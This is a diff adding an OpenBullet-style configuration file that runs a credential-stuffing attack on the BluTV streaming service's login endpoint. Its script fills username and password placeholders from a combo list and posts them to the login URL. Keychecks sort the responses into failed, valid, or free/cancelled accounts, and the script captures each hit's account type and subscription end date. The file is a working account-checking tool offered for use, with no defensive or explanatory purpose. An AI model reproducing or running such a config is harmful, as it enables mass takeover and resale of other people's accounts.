@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "1",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T05:20:31.1849038+07:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login REQUEST POST "https://www.blutv.com.tr/actions/account/login" AutoRedirect=TRUE 
+  CONTENT "password=<PASS>&remember=true&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#ERR KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+  KEYCHAIN Success OR 
+    KEY "ok" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"EndDate\":null," 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"AccountState\":\"Canceled\"" 
+#CAPTURE PARSE "<SOURCE>" LR ",\"AccountType\":\"" "\",\"PaymentType" Recursive=FALSE -> CAP "" "" "" 
+PARSE "<SOURCE>" LR "\",\"EndDate\":\"" "\",\"" Recursive=FALSE -> CAP "" "" "" 
